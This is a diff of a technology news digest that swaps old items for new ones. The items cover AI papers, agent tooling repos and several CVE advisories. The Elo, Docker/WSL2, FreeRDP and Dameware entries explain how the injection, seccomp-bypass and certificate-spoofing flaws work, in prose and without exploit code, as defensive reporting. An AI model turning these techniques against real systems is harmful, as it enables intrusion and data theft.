-"Context as Infrastructure" (Yu, Cao, Idriss, Wang, Xu, Qin, Jin, Liu) starts from a result that reframes the retrieval stack: "a harness with only BM25/grep and MiniMax M3 answers 85% of BrowseComp-Plus and 91% on multi-hop FRAMES in our runs, without compiled or vector indexes." If accuracy is that saturated, the remaining cost is context — "an undisciplined loop repeats queries, rereads documents, and fills the window with unused passages."
+The setting is a controllable one: find multiple inputs `x` for equations `f(x)=y` where `f` is a non-bijective string function. That makes the reasoning strategy observable and makes easy-to-hard OOD shifts definable (more solutions, longer `y`). Under RLVR the model learns to solve in-distribution tasks with high accuracy and structured step-by-step derivation — and then, under the OOD shift, **abandons the derivation and collapses into brute-force enumeration**, with sharp accuracy drops.
 
-The paper's most useful finding is a negative one about the layer everyone is selling. Compilation "is not a better retriever: under a competent harness, structural artifacts gave no detectable accuracy gain on FRAMES, and a PageIndex-style outline degraded at scale." What *does* pay is narrower: "A navigation tree whose leaves are claim-evidence pairs—the mechanism we measure—cuts query tokens by 91% when evidence suffices and adds 1.9% when it does not, a 38% average reduction; this implies a 2% break-even sufficiency rate and a measured rate near 43%." A decision gate cuts latency from **140 s to 30 s**, though the authors note the token saving "is bought with retrieval rounds and carries its own latency cost." Ontology, graph, wiki, timeline, mind map and memory artifacts "pay off in deployment (governance, integration, onboarding, temporal orientation, continuity) where accuracy benchmarks cannot see them."
+The authors rule out the two easy explanations: the base model is not incapable, and this is not reward hacking, since the model succeeds in-distribution with the right strategy. The intervention that fixes it is counter-intuitive — co-training with **bijective inversion** tasks, which are not uniformly harder and are further from the OOD evaluation, makes derivation more certain and substantially restores both strategy and accuracy.
 
-**Why it matters:** two claims that are usually bundled get separated here — better retrieval and better *supply*. If the harness is competent, buying a vector index for accuracy is unfalsifiable spending; the measurable win is token supply discipline, and it has an explicit break-even rate you can compute for your own corpus.
+**Why it matters:** "RLVR generalizes" is usually argued from benchmark deltas. This separates *learning a strategy* from *learning to keep it when the distribution moves*, and shows the second is trainable by a task that looks unrelated. It is also a warning about the shape of RLVR failure: the model does not get worse at reasoning, it stops bothering.
 
-[`🔗 arXiv 2610.41172`](https://arxiv.org/abs/2610.41172) · [`🔗 RAGFlow`](https://github.com/infiniflow/ragflow)
+[`🔗 Not All Reasoning Generalizes (arXiv)`](https://arxiv.org/abs/2611.03627) · [`🔗 Paper PDF`](https://arxiv.org/pdf/2611.03627)
 
 ---
 
-## 11. Nuxt's `getRouterParam` returns a different parameter than h3 matched when the path contains `%3F` — so authz and resource selection can disagree
+## 10. Superpowers is at 311,780 stars, ships v7.0.1 — and its visual companion loads a version-tagged logo from the author's server
 
 - **Velocity:** ▮▮ rising
-- **Source:** VulnCheck CNA (cveawg) · record published 2026-11-02 · fix in 4.6.2
-- **Tags:** `cve` `nuxt` `javascript` `authorization-bypass` `parser-confusion`
+- **Source:** GitHub Trending (weekly) · v7.0.1 released 2026-10-21
+- **Tags:** `agent-infra` `skills` `methodology` `telemetry` `claude-code`
 
-`CVE-2026-120309` is a route-parameter confusion bug in Nuxt and `@nuxt/nitro-server`, affecting **4.6.0 up to but not including 4.6.2**, and triggered "by sending paths containing an encoded question mark (%3F)." The effect: `getRouterParam` and `getRouterParams` can return a *different* parameter value than the one h3 actually matched. It is CWE-436, Interpretation Conflict, scored **CVSS 4.0 6.3** and **3.1 3.7** by VulnCheck, with the reporter credited as `seslo82` and a public date of **2026-10-16**. NVD's status is `Awaiting Analysis`.
+`obra/superpowers` is a software-development methodology packaged as composable skills: brainstorm to a spec, write a plan detailed enough for "an enthusiastic junior engineer with poor taste," then run subagent-driven development with two-stage review (spec compliance, then code quality). The repo has **311,780 stars**, **27,732 forks**, MIT licence, and a **v7.0.1** release dated 2026-10-21; its README lists install paths for Claude Code, Codex, Cursor, Gemini CLI, Copilot CLI, Kimi Code, Pi and others.
 
-The exploit condition is the part worth reading twice, because it is not "all Nuxt apps": the bug is exploitable when "authorization checks use the Nuxt helper value while resource selection uses `event.context.params`," "allowing access to unauthorized resources." In other words, two ways of asking the same question get two different answers, and only a codebase that mixes them is affected.
+The item worth flagging is a section most readers will skip. Under **Visual companion telemetry**, the README states that the optional visual companion loads the Prime Radiant logo from the project's website and that the request "includes the version of Superpowers in use," because "skills and plugins don't provide any feedback to creators" and they otherwise have no idea how many people use it. It is disclosed, scoped (no project, prompt or agent details), and opt-out via `SUPERPOWERS_DISABLE_TELEMETRY`, and it honours Claude Code's `DISABLE_TELEMETRY` and `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC`.
 
-**Why it matters:** a 6.3 that depends on a programming pattern is easy to dismiss and easy to be wrong about, because the pattern is exactly what a framework helper invites — you reach for `getRouterParam` in the guard and for `event.context.params` in the handler without noticing they are different sources. Grep for both in the same route before deciding you are unaffected.
+**Why it matters:** this is what a skills framework looks like when it wants a usage number and the host gives it none — a beacon in the one optional surface it controls, disclosed in the README rather than in a config screen. It is a reasonable design, and it is also the shape that will be copied without the disclosure. Check `SUPERPOWERS_DISABLE_TELEMETRY` before assuming a skill is just markdown.
 
-[`🔗 CVE-2026-120309 (cveawg)`](https://cveawg.mitre.org/api/cve/CVE-2026-120309) · [`🔗 Nuxt security advisories`](https://github.com/nuxt/nuxt/security/advisories)
+[`🔗 obra/superpowers`](https://github.com/obra/superpowers) · [`🔗 Telemetry section in the README`](https://github.com/obra/superpowers#visual-companion-telemetry) · [`🔗 v7.0.1 release`](https://github.com/obra/superpowers/releases/tag/v7.0.1)
 
 ---
 
-## 12. rTaste gave six research agents 415 experiments to rank — the rankings beat random, but not the experiment you wrote down first
+## 11. A 229,008-star "Karpathy skills" repo has no licence, no releases, and no commit since April 20
 
 - **Velocity:** ▮▮ rising
-- **Source:** arXiv 2610.40488 · submitted 2026-10-30
-- **Tags:** `agents` `evaluation` `research` `negative-result` `benchmark`
+- **Source:** GitHub Trending (weekly) · last commit 2026-04-20
+- **Tags:** `agent-infra` `claude-code` `licensing` `repo-state` `dormant`
 
-"rTaste: Do Research Agents Have Taste?" (Art Kanke) asks the question that every "AI scientist" demo skips: given a paper, can an agent tell which experiment is *worth running* before anyone knows the outcome? Six frontier models, alone or as teams, propose minimum viable experiments, forecast whether each will pass a threshold they set, and rank them. A separate executor then runs **every** MVE — "including those ranked last" — and three model auditors judge the results.
+`multica-ai/andrej-karpathy-skills` is a single `CLAUDE.md` derived from Andrej Karpathy's public complaints about LLM coding — wrong assumptions made on your behalf, overcomplicated abstractions, orthogonal edits to code the model does not understand — reduced to four principles. It has **229,008 stars** and **22,828 forks**. The API reports **no licence**, there is **no release**, and the file listing at the repo root is seven entries with no `LICENSE` among them. It has **0 open issues and 108 open pull requests**. The newest commit is **2026-04-20**, a README sync adding a Cursor section — 198 days before this run.
 
-The result is a careful negative. "Of 415 MVEs, 194 are judged sound, valuable and new, but fewer than half of these (73) are also judged beyond the seed paper and non obvious." On ranking: "The agents' first choices match the auditors' most valued experiment more often than a random pick, but are not shown to improve on choosing the experiment written first." Forecasts "beat a base rate but are not measurably more accurate than those of a fresh instance of the same model given only the paper and registrations." And teams — the configuration everyone reaches for — "cost more without a clear overall improvement in proposal quality."
+What the repo *is* doing is pointing elsewhere: the first line of the README is a promotion for the author's newer project, **Multica**, "an open-source platform for running and managing coding agents with reusable skills," plus an X handle.
 
-**Why it matters:** the agents are good at *generating* worthwhile experiments and unproven at *selecting* them, which is the opposite of the ordering the products assume. A ranking that cannot beat taking the first idea is a cost, not a capability — and the paper publishes all 415 MVEs, their forecasts and their audited outcomes, so the claim is re-checkable rather than asserted.
+**Why it matters:** a six-figure star count on a seven-file repo with no licence is the Void pattern with the sign flipped — the artifact is tiny and static, and the attention is real but historical. Practically: no licence means the default is all-rights-reserved in most jurisdictions, so copying this `CLAUDE.md` into your repo is a redistribution question the star count does not answer. Judge it as a short, readable prompt, not as a maintained dependency.
 
-[`🔗 arXiv 2610.40488`](https://arxiv.org/abs/2610.40488) · [`🔗 Full text (HTML)`](https://arxiv.org/html/2610.40488v1)
+[`🔗 multica-ai/andrej-karpathy-skills`](https://github.com/multica-ai/andrej-karpathy-skills) · [`🔗 Commit history (newest 2026-04-20)`](https://github.com/multica-ai/andrej-karpathy-skills/commits/main)
 
 ---
 
-## 13. PostHog held 2 PB in per-customer DuckDB instances and is moving off it — "DuckLake is built for compatibility, not scale"
+## 12. Spotify open-sourced a plugin marketplace for coding agents — and one plugin exists to route bulk work to cheaper models
 
 - **Velocity:** ▮▮ rising
-- **Source:** PostHog blog · 124 pts on HN · 2026-11-02
-- **Tags:** `databases` `duckdb` `trino` `infrastructure` `analytics`
+- **Source:** GitHub Trending (daily) · pushed 2026-10-23
+- **Tags:** `agent-infra` `plugins` `spotify` `mcp` `cost`
 
-PostHog is not calling DuckDB bad — it calls it "brilliant on one machine." The problem was running it as a multi-tenant cloud warehouse: five months after replacing a shared ClickHouse cluster with per-customer DuckDB instances holding, at the move, "about 2 PB," or "roughly 1 trillion rows and 15.3 million snapshots." It is now rebuilding on a customized Trino deployment with its own table format, HogLake.
+`spotify/portal-ai-plugins` (3,003 stars, Apache-2.0, TypeScript) packages Spotify Portal into Claude Code, Codex, Cursor and pi as a plugin marketplace with workflows for auth setup, software-catalog search, service briefings, diagnostics and dry-run-gated actions. The install path is the new standard one — `claude plugin marketplace add spotify/portal-ai-plugins`, then `claude plugin install portal@portal`.
 
-The failure modes are specific and transferable. Single-node sizing meant choosing worker resources before seeing the query, and "the ergonomics here are wonky." DuckLake's portable catalog schema restricted engine-specific optimizations — **"DuckLake is built for compatibility, not scale"** — and at PostHog's scale "a single-table write could take more than three minutes." Catalog statistics bloated until "over 99% of the catalog's statistics rows belonged to tables that no longer existed"; removing them made writes **30–50 times faster**, but the rows returned, and PostHog ended up maintaining a fork. It also notes that DuckDB lacked asynchronous S3 fetching until recently, and that offering direct Postgres connections on port 5432 "sounds like a great idea" but "in practice, it was much harder to scale than HTTP."
+The second plugin in the same marketplace is the one to read. **shunt** (Claude Code only for now) routes "I/O-heavy agent work — bulk file reads and boilerplate generation" to "AiKA modes running cheaper worker models" through the Portal CLI's action registry. It ships as a sibling of the enterprise connector rather than as a product, which is how internal cost engineering usually surfaces.
 
-**Why it matters:** the per-tenant-database pattern is the current default answer to analytics isolation, and this is a first-hand account of where it stops — not at correctness but at the catalog and the single-node sizing decision you have to make blind. The 30–50× write speedup from deleting dead statistics rows is the kind of number that is worth checking in your own warehouse before migrating anything.
+**Why it matters:** a large vendor publishing a plugin marketplace is a signal that agent plugins are converging on one install-and-permission model across hosts — the same model whose trust boundary Postman's installer crossed in item 1. And `shunt` is the first openly published example of the pattern most agent teams arrive at privately: keep the expensive model for judgement, delegate the token-burning to something cheaper, and make the routing a policy rather than a prompt.
 
-[`🔗 Moving our warehouse off DuckDB`](https://posthog.com/blog/moving-off-duckdb) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50338747)
+[`🔗 spotify/portal-ai-plugins`](https://github.com/spotify/portal-ai-plugins) · [`🔗 shunt README`](https://github.com/spotify/portal-ai-plugins/blob/main/plugins/shunt/README.md) · [`🔗 Portal CLI on npm`](https://www.npmjs.com/package/@spotify/portal-cli)
 
 ---
 
-## 14. Cloudflare cut DNS zone-build memory 85% by rebuilding only what changed — with the rule that makes it safe stated up front
+## 13. SolarWinds Dameware's 9.9 is a command injection that needs only a login — and the advisory credits Boeing's red team
 
 - **Velocity:** ▮▮ rising
-- **Source:** Cloudflare blog · 94 pts on HN · 2026-11-02
-- **Tags:** `dns` `infrastructure` `cloudflare` `performance` `distributed-systems`
+- **Source:** SolarWinds Trust Center · first published 2026-11-03
+- **Tags:** `cve` `solarwinds` `command-injection` `remote-support` `9.9`
 
-Cloudflare's DNS Zone Builder used to treat a zone-setting change as a full rebuild — read, encode, compare and hold every record in memory — which does not scale when "some zones now hold more than 20 million records, and we expect them to keep growing toward hundreds of millions." The new design has event producers identify which zone fields and settings changed, and a planner picks one of five paths (targeted record work, records plus metadata, apex plus metadata, purge, or full build). A unified scheduler merges queued work for the same zone over soft Kafka commits, and builds are planned from the event, then re-checked against a fresh database snapshot.
+`CVE-2026-28336` is a command injection in SolarWinds Dameware affecting **2026.3 and all previous versions**, fixed in **2026.3.1**, rated **9.9 Critical** on the vendor's own vector `CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`. The `S:C` (scope change) plus `PR:L` is what pushes a low-privilege bug to 9.9: the injected command does not stay inside the component that accepted it, and the advisory's one-sentence summary says it "could lead to the compromise of the remotely controlled host."
 
-The safety rule is the interesting engineering: **"every key a targeted build writes must be byte-for-byte identical to what a full build would write,"** enforced by equivalence tests and a production mirror — and "The planner never turns uncertainty into less work" — missing details, unknown events, or any change that might affect records anywhere in the zone still get a full build. Over 24 hours, **92.95% of builds avoided a full zone rebuild** (7.04% remained full), full builds fell about **40%**, peak memory went from **79 GiB to 12 GiB** (−85%), the largest p99 spike fell from **14.6 minutes to 1.21 minutes**, and median build completion halved from about **7.7 s to 3.3 s**. The mirror comparison found a **0.31% diff rate across 234,313 matched zones**, much of it temporary timing skew.
+Two provenance facts belong with the number. The metric on the NVD record is `Secondary psirt@solarwinds.com` and the record status is `Received` — so 9.9 is the **CNA's** score, not NVD's analysis, and it will likely be re-served unchanged. And the credit line names **Greg Bernatowicz on the Boeing Enterprise Security Red Team**, which is the same disclosure shape as last week's run of vendor-credited findings: an outside red team, a patch, then a record.
 
-**Why it matters:** the caveats are as useful as the wins. Cloudflare says the latency figures "combine every build type and customer plan, so they are not a latency guarantee for an individual zone," that much of the remaining delay is the deliberate rebuild interval, and that network distribution time is excluded. Full builds still exist for first publication and for any event that does not say what changed — which is the honest shape of an incremental system: the fallback is the spec.
+**Why it matters:** Dameware is remote-support software, which means the affected hosts are the ones administrators use to reach everything else, and the exploit needs a foothold rather than nothing. The remediation is a version bump to 2026.3.1, and the interesting part of the advisory is how short it is — no exploitation status, no attack complexity discussion, no note on whether the injected path is pre- or post-authentication beyond "Authentication is required."
 
-[`🔗 Cloudflare: DNS targeted zone builds`](https://blog.cloudflare.com/dns-targeted-zone-builds/) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50337558)
+[`🔗 SolarWinds advisory CVE-2026-28336`](https://www.solarwinds.com/trust-center/security-advisories/CVE-2026-28336) · [`🔗 Dameware 2026.3.1 release notes`](https://documentation.solarwinds.com/en/success_center/dameware/content/release_notes/dameware_2026-3-1_release_notes.htm)
 
 ---
 
-## 15. GPT-Rosalind-6 adds no training data and no post-training — it is GPT-6 Astra's weights behind a biology access gate
+## 14. A no-code expression language shipped two 9.8s in one afternoon — the Ruby backend forgot to escape `#`
 
 - **Velocity:** ▮▮ rising
-- **Source:** OpenAI deployments safety · system card addendum · 2026-11-02
-- **Tags:** `ai-safety` `biosecurity` `openai` `system-card` `policy`
+- **Source:** GitHub Advisory Database · GHSA published 2026-10-30, CVE records 2026-11-03
+- **Tags:** `cve` `rce` `ruby` `template-injection` `sstf`
 
-OpenAI published a system card addendum for **GPT-Rosalind-6**, "a frontier reasoning model for biology, drug discovery, and translational medicine," and the disclosure's first useful sentence is that it is a re-release rather than a new model: it "uses the same weights as GPT-6 Astra," and **"We did not add training data or perform additional post-training for this release."** What changed is the access policy, not the network.
+Elo compiles a functional expression language to Ruby, JavaScript, Python and SQL for no-code tools. The advisory we read on the repo's own page is specific down to line numbers: the string-literal emitter at `src/compilers/ruby.ts` lines 180–184 escapes backslash, double quote and control characters but **not `#`**, and a second sink at lines 405–412 wraps a subtype-constraint label in a Ruby double-quoted string "with no escape pass at all." Because `#{...}` is Ruby interpolation and backticks inside it run shell commands, a crafted Elo string compiles to attacker-chosen code — and "the same Elo source compiled to JavaScript, Python, or SQL is benign," which is how the bug breaks the compiler's own portability promise.
 
-The beneficial-capability numbers against GPT-Rosalind-5.5 at the highest reasoning budget are large — MedChemBench v7 **49.6% vs 28.9%**, GeneBench Pro v13 single-attempt **37.7% vs 16.7%**, LifeSciBench Gold **61.3% vs 44.0%** — and so is the risk posture. OpenAI treats the model as "High capability in the Biological and Chemical domain, below the threshold for Critical" and as "Critical in Cybersecurity," inheriting Astra's assessments for cyber and self-improvement. Of the four High-capability preparedness evaluations: "After adjusting for refusals, GPT-Rosalind-6 exceeds the indicative High capability thresholds on three of the four evaluations. We therefore continue to treat the model as High capability." The addendum adds that against GPT-Rosalind-5.5, "observed scores are higher on three evaluations and lower on Biorisk knowledge." On the four Critical evaluations — AAV capsid packaging (0.600), SHP2 function (0.60), coronavirus-ACE2 entry (0.75) and phage-plasmid co-evolution (NLL ≤ 9.40) — **"None of the four Critical capability evaluations met its indicative threshold."**
+Two records carry it, both **9.8** with `AV:N/AC:L/PR:N/UI:N`: `CVE-2026-44266` (interpolation via the string-literal emitter and the labelled subtype-constraint branch; entry points include the `/try` playground with the Ruby target and `bin/eloc -t ruby -x`) and `CVE-2026-44267` (`.constructor.constructor` reaching JavaScript's `Function`, via a `member_access` handler in `src/transform.ts` that "does not reject meta-properties"). Both are fixed in **1.0.1**; the advisory says affected is `<= 1.0.0`. The scores are GitHub's (`security-advisories@github.com`), and both records are still `Received`.
 
-**Why it matters:** the one number that undercuts the launch framing is **Biorisk knowledge cons@32: 78.3% for Rosalind-6 versus 79.2% for Rosalind-5.5** (GPT-6 Astra: 63.3%) — read beside the table's next two rows, which is where the framing partly recovers: refusal rates are **9.4%** and **1.8%**, and refusal-adjusted cons@32 is **85.0%** for Rosalind-6 against an indicative High threshold of **80%**, so the raw 78.3% misses the bar while the adjusted number clears it. A "new" biology model that scores marginally *below* its predecessor on the unadjusted headline probe, with identical weights, is a reminder that a version bump here is an access decision — and the safeguards (approved customers only, business verification, compliance screening, qualified human review before outputs inform experiments) are the actual content of the release.
+**Why it matters:** the `#` character is the whole vulnerability, and it is missing from an escape list that otherwise looks complete — the exact class of bug a "we escape strings" code review passes. The two CVEs are also a reminder that an expression language with four backends has four independent injection surfaces and only one of them will be found by testing the playground you use.
 
-[`🔗 GPT-Rosalind-6 system card addendum`](https://deploymentsafety.openai.com/gpt-rosalind-6) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50337503)
+[`🔗 GHSA-7w38-ggh5-v542 (Ruby backend RCE)`](https://github.com/enspirit/elo/security/advisories/GHSA-7w38-ggh5-v542) · [`🔗 GHSA-33r5-xmm8-v6x5 (JS constructor escape)`](https://github.com/enspirit/elo/security/advisories/GHSA-33r5-xmm8-v6x5) · [`🔗 enspirit/elo`](https://github.com/enspirit/elo)
 
 ---
 
-## 16. Chainalysis says an intruder used "offensive agentic techniques" — and names the four fields it believes were taken
+## 15. FreeRDP's new 9.1 is an incomplete fix: two of three certificate-identity bugs were byte-identical from 3.29.0 to HEAD
 
 - **Velocity:** ▮▮ rising
-- **Source:** Chainalysis incident notice · published 2026-10-30 · coverage 2026-10-31
-- **Tags:** `security-incident` `agents` `disclosure` `crypto` `attribution`
+- **Source:** FreeRDP advisory GHSA-jq25-3374-4262 · published 2026-10-19, CVE record 2026-11-03
+- **Tags:** `cve` `freerdp` `tls` `mitm` `incomplete-fix`
 
-Chainalysis published a security incident notice on **2026-10-30** saying it "detected an external actor using offensive agentic techniques" to reach its systems and internal tools during October. The data it names is narrow and specific: **"user IDs, full names, email addresses, and organization role labels."** The data it says it found no evidence of is the part that matters for a forensics-adjacent company: "no evidence of unauthorized access to investigation content, authentication credentials, or session tokens," with the customer email adding transaction and query results, cleartext passwords and MFA secrets to the not-exposed list. Investigation content means graphs, notes and cases.
+The advisory's own title is the finding: **"Incomplete fix for GHSA-43hh-p3vw-hfx3: CN-fallback and IP-literal cert identity checks were never patched."** The earlier advisory, patched in **3.29.0**, claims to fix three certificate identity-validation weaknesses in `tls_verify_certificate()` / `tls_match_hostname()` / `x509_utils_get_dns_names()`. The actual 3.29.0 commit set (`af7f228`, `c5a7325`, `b7db8d2`) *only addresses the embedded-NUL-byte truncation case*, while the Common-Name-fallback-despite-non-matching-SAN case and the IP-literal-matched-via-DNS-SAN case are, in the advisory's wording, *byte-identical in `libfreerdp/crypto/tls.c` from the 3.29.0 tag through current HEAD*.
 
-The framing is the weakest part of the disclosure and the notice is careful not to overclaim it. Chainalysis does not say how many users or organizations are affected, what the entry point was, which vulnerabilities were patched, how long the actor had access, or what "agentic" concretely means — whether a known framework or custom agents. It also states the incident is **"not related to the recent crypto theft at Binance,"** and says it engaged third-party experts and used "sophisticated large language models" in its own security review. Guidance to customers is MFA plus vigilance for "unexpected password reset requests or authentication prompts" — which is the right advice for a list of names, emails and org roles, because that list is a targeting set.
+The threat model is stated precisely and is not "no authentication": an attacker who can present a certificate chaining to a CA the client already trusts — a misissuing public CA, a rogue private CA — can silently pass identity verification and man-in-the-middle the RDP session (screen, keystrokes, clipboard, input injection). Fixed in **3.32.2**. The NVD record carries a VulnCheck 4.0 score of **9.1** (`AC:H`, `AT:P`) beside a 3.1 of **7.4** — the same vector at two frameworks, and the spread is the physical-attack/`AT:P` term, not a disagreement. The advisory also carries a line more reports should: **"This report was submitted with AI assistance."**
 
-**Why it matters:** a victim describing an intrusion as agentic is a claim about the attacker's tooling that the victim may not be able to substantiate, and this notice does not try to. Read the useful part as the four-field scope and the absence of a stated count: a breach notice that names its data precisely and its attacker vaguely is more trustworthy than the reverse, and the phishing exposure for crypto-compliance staff is the concrete operational consequence.
+**Why it matters:** "fixed in 3.29.0" was false for two of the three cases for eleven releases, which means anyone who upgraded and stopped watching has been exposed the whole time. The general lesson is cheap to apply: when an advisory claims to close a *set* of related cases, check that the commit touches all of them — here two of three sinks had no diff at all.
 
-[`🔗 Chainalysis incident notice`](https://www.chainalysis.com/blog/security-incident-october-30/) · [`🔗 BleepingComputer report`](https://www.bleepingcomputer.com/news/security/chainalysis-discloses-data-breach-from-offensive-agentic-techniques/) · [`🔗 The Block`](https://www.theblock.co/news/business/2026-10-31-chainalysis-says-hacker-using-offensive-agentic-techniques-accessed-its-customers-names-and-emails-432244)
+[`🔗 GHSA-jq25-3374-4262 (FreeRDP)`](https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-jq25-3374-4262) · [`🔗 CVE-2026-121392 (NVD)`](https://nvd.nist.gov/vuln/detail/CVE-2026-121392)
 
 ---
 
-## 17. Scrapling's v0.5 MCP server "can solve almost any CAPTCHA" — and the release it shipped in broke the old API
+## 16. Docker Desktop 4.98.0 closes the WSL2 seccomp bypass — and quietly ships the kernel fix Ubuntu still has not
 
 - **Velocity:** ▮▮ rising
-- **Source:** GitHub Trending · 858 stars today · v0.5 released 2026-10-17
-- **Tags:** `scraping` `python` `mcp` `agents` `open-source`
+- **Source:** Docker Desktop release notes · 4.98.0 released 2026-11-03
+- **Tags:** `docker` `wsl2` `seccomp` `cve` `kernel`
 
-Scrapling is a Python scraping framework at **92,634 stars** and BSD-3-Clause, trending today at 858 stars, and the version that matters is **v0.5, released 2026-10-17** — two weeks before it started climbing. That release is explicitly a break: "This release introduces a lot of breaking changes that don't fit here. Check the Migrating to v0.5 guide before updating." What it adds is agent-facing: "A much more capable MCP server for AI agents that can solve almost any CAPTCHA," complete browser workflows as one ordered sequence — fill forms, click, hover, scroll, use the keyboard, handle dialogs, wait for results, "with actions stopping at the first error" — and reading or searching the current page, as HTML, Markdown or text, without a reload.
+The release notes list two security entries. First, `CVE-2026-112917`: on Docker Desktop for Windows with the WSL2 backend, an unprivileged Linux container "can use 32-bit socketcall to bypass the default seccomp restriction on **AF_VSOCK**," exposing host-facing services and Windows files reachable by the logged-in user. Docker scores it **9.2** on CVSS 4.0 (`AV:L/AC:L/PR:L/UI:N/VC:H/VI:H`) and is explicit about the fix being a pair: **Docker Desktop 4.98.0 or later AND WSL 3.0.3 or later** — "Docker Desktop 4.98.0 or later running on an older WSL remains affected." The seccomp filter blocked the 64-bit `socket` syscall with `AF_VSOCK` and not the 32-bit `socketcall` multiplexer, which is the classic 32-bit-syscall filter gap reappearing on x86-64.
 
-The repo's tracker carries **4 open issues and 4 open PRs** (read 2026-11-03) against 9,760 forks — the `open_issues_count` field reads 8 only because GitHub sums the two — and PyPI's `latest` is **0.5**, so what is documented is what is installable. Prior releases followed the same pattern: v0.4.15 on 2026-08-23 reworked the MCP server and added "RAG-ready Markdown in one line," and v0.4.14 was a maintenance release fixing `uv` silently falling back to an older version.
+Second, and more interesting given this feed's coverage: **"Fixed CVE-2026-98432, a use-after-free in the Linux kernel's IPv4 TCP handling."** The record's references point at `linux-msft-wsl-6.18.54.1` and WSL `3.0.3`, so what Docker shipped is a bundled kernel that carries the fix. We wrote on 2026-11-03 that Ubuntu still shipped no kernel closing that CVE three weeks after publication; as of today, Docker Desktop users on Windows have a version that does, and Ubuntu users still do not.
 
-**Why it matters:** a scraper whose headline feature is CAPTCHA solving is a tool class with a moving legal and ethical boundary, and the honest read is that the MCP surface — not the parsing — is why it is trending: agent frameworks need a browser they can drive and a page they can read as Markdown, and this ships both behind one `npx`. Pin to 0.5 knowingly; the migration guide exists because the previous interface does not carry over.
+**Why it matters:** the 32-bit syscall gap is a seccomp-table habit, not a Docker bug, and the same table is copied into other container runtimes. The second entry is the more useful one for defenders: the kernel fix for a bug Ubuntu has not shipped is now in a desktop product's embedded kernel, which means whether a host is vulnerable has a different answer depending on whether your container runs on WSL2 or on an Ubuntu LTS host.
 
-[`🔗 Scrapling repo`](https://github.com/D4Vinci/Scrapling) · [`🔗 v0.5 release notes`](https://github.com/D4Vinci/Scrapling/releases/tag/v0.5) · [`🔗 v0.4.15 release notes`](https://github.com/D4Vinci/Scrapling/releases/tag/v0.4.15) · [`🔗 PyPI`](https://pypi.org/project/scrapling/)
+[`🔗 Docker Desktop 4.98.0 release notes`](https://docs.docker.com/desktop/release-notes/#4980) · [`🔗 CVE-2026-112917 (NVD)`](https://nvd.nist.gov/vuln/detail/CVE-2026-112917) · [`🔗 WSL 3.0.3 release`](https://github.com/microsoft/WSL/releases/tag/3.0.3)
 
 ---
 
-## 18. BlindToChange: agents that search perfectly still miss the change nobody told them to look for — a 27.5-point gap
+## 17. Craft Anything points an agent at any app and has it build a clean-room copy — 7,798 stars in four days, and its own status page is honest
+
+- **Velocity:** ▮▮ rising
+- **Source:** GitHub · created 2026-10-31 · 7,798 stars · Apache-2.0 / MIT
+- **Tags:** `agent-infra` `rust` `mcp` `reverse-engineering` `clean-room`
+
+The premise is unusually direct: point it at a website, desktop app or game, describe what you want, and a coding agent studies the original, builds a new project in the stack you ask for, then compares the build against the original at three screen widths and refines until it is close. The engine is **pure Rust**, exposes **320 tools** each as both a CLI command and an MCP tool, and runs as a desktop app, a CLI and an MCP server.
+
+The design decision that matters is the default. **Clean room** means "nothing inside the original is read, not its code, files or page source" — it works only from what a visitor can see (screenshots, visible text, measured layout, colours, fonts, spacing), and tools that would look inside are refused with an explanation of how to enable Deep mode. **Deep** reads code, files and JavaScript, with Ghidra when installed, "for your private use." The responsible-use paragraph says it "never bypasses DRM, logins or anti-cheat" and that the agent is told not to copy logos, photos or text unless you confirm you own them. The status block is equally specific about what is unfinished: building with API keys and other coding agents is **"built, not yet run live,"** behaviour checks for apps and games are partial, and some engine tools were tested only against stand-ins.
+
+**Why it matters:** this is the first widely-starred tool that packages "clone this software" as an agent workflow, and it has made the legally interesting choice on purpose — clean-room by default, source-reading opt-in. Whether that holds up is not a technical question, but shipping the distinction, the refusal behaviour and the anti-DRM statement in the README is more than the category usually does.
+
+[`🔗 storytold/craft-anything`](https://github.com/storytold/craft-anything) · [`🔗 docs/STATUS.md`](https://github.com/storytold/craft-anything/blob/main/docs/STATUS.md)
+
+---
+
+## 18. I jailbroke my car's navigation unit to change the clock — the "set time" menu only exists if a maps SD card is mounted
+
+- **Velocity:** ▮▮ rising
+- **Source:** blog.nns.ee · 2026-11-02 · 382 pts on HN
+- **Tags:** `reverse-engineering` `automotive` `qnx` `firmware` `writeup`
+
+The write-up starts with a 2014 Renault Latitude whose clock is an hour off after the DST switch and whose "Set time" option is simply absent from the settings menu — the previous owner's claim that the car "apparently needs this SD card just to change the time on the clock" turned out to be true. The second Settings button raises `No maps detected!` instead of opening. So the author pulled the firmware from the vendor's update endpoints, found the update archive contains a `ttsystem` file that is an **ext3 filesystem**, and worked from there.
+
+The useful part is the methodology, not the punchline: the reverse-engineering was bootstrapped from a public French README (`andronedev/carminat-tomtom-live-re`) that the author describes as "seemingly heavily LLM-assisted" but which correctly identified the update URLs — a reminder that LLM-written documentation is often accurate about *where the files are* while being unreliable about *what to do with them*. From there it is filesystem extraction, a QNX-based unit, and the discovery that a code path gated on map data also gated a clock setting.
+
+**Why it matters:** this is the shape of modern embedded reverse engineering — vendor update servers as the primary artifact, a community note as the map, and no vendor cooperation at any point. It is also a small, exact example of a state machine where a UI element is not missing but *conditional*, and where the honest fix is not a settings toggle but understanding what the unit is waiting for.
+
+[`🔗 Jailbreaking my car's navigation system`](https://blog.nns.ee/2026/11/02/renault-hack/) · [`🔗 carminat-tomtom-live-re (prior work)`](https://github.com/andronedev/carminat-tomtom-live-re/blob/main/README.md) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50339288)
+
+---
+
+## 19. pixelfx ships 244 pixel-art effects as small programs — and marks the count in the README with HTML comments, for the machines
 
 - **Velocity:** ▮ steady
-- **Source:** arXiv 2610.41435 · submitted 2026-10-30
-- **Tags:** `agents` `search` `benchmark` `evaluation` `freshness`
+- **Source:** GitHub · created 2026-10-30 · 4,060 stars · MIT
+- **Tags:** `dev-tools` `pixel-art` `claude-skill` `open-source` `games`
 
